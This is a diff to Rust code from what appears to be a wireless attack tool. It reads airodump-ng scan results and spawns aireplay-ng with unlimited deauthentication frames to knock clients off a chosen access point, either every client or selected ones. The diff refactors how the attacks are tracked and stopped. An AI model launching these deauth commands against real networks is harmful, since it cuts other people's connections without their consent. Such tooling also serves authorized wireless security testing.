@@ -191,6 +191,10 @@ pub fn stop_scan_process() {
 
 pub fn get_airodump_data() -> Option<Vec<AP>> {
     let mut aps = vec![];
+    for attacked_ap in ATTACK_POOL.lock().unwrap().iter() {
+        aps.push(attacked_ap.1.0.clone());
+    }
+
     let full_path = SCAN_PATH.to_string() + "-01.csv";
     let csv_file = match std::fs::read_to_string(full_path) {
         Ok(file) => file,
@@ -260,7 +264,7 @@ pub fn get_airodump_data() -> Option<Vec<AP>> {
     Some(aps)
 }
 
-pub fn launch_deauth_attack(ap_bssid: &str, only_specific_clients: Option<Vec<String>>) {
+pub fn launch_deauth_attack(ap: AP, only_specific_clients: Option<Vec<String>>) {
     let iface = match IFACE.lock().unwrap().as_ref() {
         Some(res) => res.to_string(),
         None => return,
@@ -275,35 +279,35 @@ pub fn launch_deauth_attack(ap_bssid: &str, only_specific_clients: Option<Vec<St
                 cli_attack_targets.push((
                     cli.to_owned(),
                     Command::new("aireplay-ng")
-                        .args(["-0", "0", "-D", "-a", ap_bssid, "-c", &cli, &iface])
+                        .args(["-0", "0", "-D", "-a", &ap.bssid, "-c", &cli, &iface])
                         .stdout(std::process::Stdio::null())
                         .spawn()
                         .expect("failed to execute process: aireplay-ng"),
                 ));
             }
-            AttackTargets::Selection(cli_attack_targets)
+            AttackedClients::Selection(cli_attack_targets)
         }
-        None => AttackTargets::All(
+        None => AttackedClients::All(
             Command::new("aireplay-ng")
-                .args(["-0", "0", "-D", "-a", ap_bssid, &iface])
+                .args(["-0", "0", "-D", "-a", &ap.bssid, &iface])
                 .stdout(std::process::Stdio::null())
                 .spawn()
                 .expect("failed to execute process: aireplay-ng"),
         ),
     };
 
-    attack_pool.insert(ap_bssid.to_string(), attack_targets);
+    attack_pool.insert(ap.bssid.to_string(), (ap, attack_targets));
 }
 
 pub fn stop_deauth_attack(ap_bssid: &str) {
     let mut attack_pool = ATTACK_POOL.lock().unwrap();
     if let Some(attack_target) = attack_pool.get_mut(ap_bssid) {
-        match attack_target {
-            AttackTargets::All(child) => {
+        match &mut attack_target.1 {
+            AttackedClients::All(child) => {
                 child.kill().unwrap();
                 child.wait().unwrap();
             }
-            AttackTargets::Selection(child_list) => {
+            AttackedClients::Selection(child_list) => {
                 for (_cli, child) in child_list {
                     child.kill().unwrap();
                     child.wait().unwrap();
@@ -321,12 +325,12 @@ pub fn app_cleanup() {
     }
 
     for attacked_ap in ATTACK_POOL.lock().unwrap().iter_mut() {
-        match attacked_ap.1 {
-            AttackTargets::All(child) => {
+        match &mut attacked_ap.1.1 {
+            AttackedClients::All(child) => {
                 child.kill().unwrap();
                 child.wait().unwrap();
             }
-            AttackTargets::Selection(child_list) => {
+            AttackedClients::Selection(child_list) => {
                 for (_cli, child) in child_list {
                     child.kill().unwrap();
                     child.wait().unwrap();
